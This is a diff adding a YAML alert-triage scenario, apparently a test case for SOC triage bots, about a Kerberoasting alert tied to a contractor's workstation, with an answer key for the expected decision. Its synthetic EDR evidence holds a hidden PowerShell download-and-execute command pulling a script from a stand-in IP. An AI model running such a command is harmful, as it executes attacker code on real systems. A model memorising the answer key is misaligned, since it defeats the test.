@@ -1,0 +1,37 @@
+id: hitl-downgrade-kerberoast-red-team-v2
+title: "Kerberoasting: RC4 service tickets for 22 SPNs"
+splunk_rule_name: "Access - Kerberoasting Activity Detected - Rule"
+splunk_severity: high
+outcome_class: hitl_confirm
+assessed_severity: high
+weight: 0.7
+mitre_techniques: [T1558.003]
+entities:
+  user: {ref: "user:d.varga"}
+  ws: {ref: "host:WS-CTR-012"}
+  dc: {ref: "host:DC-02"}
+alert:
+  title: "Kerberoasting from ${ws.id}: ${user.id} requested RC4 tickets for 22 SPNs in 2 minutes"
+  description: "${dc.id} issued 22 TGS tickets with encryption type 0x17 to ${user.id} from 10.30.9.112 (${ws.id})."
+  fields: {user: "${user.id}", src: "${ws.id}", src_ip: 10.30.9.112, dest: "${dc.id}", ticket_encryption: "0x17", spn_count: 22, signature_id: 4769}
+evidence:
+  - source: auth
+    sourcetype: "WinEventLog:Security"
+    offset_s: -120
+    fields: {EventCode: 4769, Computer: "${dc.id}", TargetUserName: "${user.id}@CORP.KESTRELGATE.EXAMPLE", IpAddress: "::ffff:10.30.9.112", TicketEncryptionType: "0x17", ServiceName_count: 22}
+  - source: edr
+    sourcetype: "crowdstrike:events:sensor"
+    offset_s: -125
+    fields: {host: "${ws.id}", event_simpleName: ProcessRollup2, user: "${user.id}", image: powershell.exe, parent: explorer.exe,
+             cmdline: "powershell -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://192.0.2.45/k.ps1')\""}
+  - source: proxy
+    sourcetype: "zscaler:web"
+    offset_s: -126
+    fields: {client: "${ws.id}", user: "${user.id}", method: GET, url: "http://192.0.2.45/k.ps1", category: "Miscellaneous or Unknown", action: Allowed, bytes_in: 48312}
+  - source: edr
+    sourcetype: "crowdstrike:events:detection"
+    offset_s: -110
+    fields: {host: "${ws.id}", tactic: "Credential Access", technique: "Kerberoasting", severity: High, PatternDisposition: "Detect only"}
+analyst_knowledge:
+  - fact: "The only red-team engagement this quarter closed last Friday. Its rules of engagement never included d.varga, a contractor on the IAM project with no testing mandate."
+    effect_on_decision: "The red-team explanation the bots might reach for doesn't apply. Confirm at high, disable d.varga, reset the roasted service accounts and isolate WS-CTR-012."
